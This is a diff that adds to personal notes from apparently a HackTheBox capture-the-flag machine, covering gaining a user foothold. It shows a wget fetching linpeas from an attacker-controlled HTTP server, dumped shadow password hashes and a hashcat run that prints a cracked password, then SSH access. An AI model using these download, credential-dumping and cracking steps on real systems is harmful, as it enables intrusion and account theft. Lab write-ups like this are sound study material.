@@ -85,3 +85,44 @@ So it connects me as root... but I am not seeing anything.
 Maybe I need to connect with SSH
 
 Nope, neither root nor michael have a .ssh to copy
+
+Get linpeas on the machine.
+
+My machine:
+`python3 -m http.server 8001`
+
+Target machine:
+`wget http://10.10.14.98:8001/linpeas.sh `
+
+
+Results:
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
+
+```
+hashcat hash.txt /Users/noneya/Useful/Wordlists/rockyou.txt
+
+$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
+```
+I can SSH now.
+
+That gets me User. Now for priv esc
+
+# Priv esc
+
+Run linpeas again after running this again:
+
+My machine:
+`python3 -m http.server 8001`
+
+Target machine:
+`wget http://10.10.14.98:8001/linpeas.sh `
+
+Was lost, found the answer online... https://thecybersecguru.com/ctf-walkthroughs/mastering-sightless-beginners-guide-from-hackthebox/
+
+But didn't root the box because thats not fair
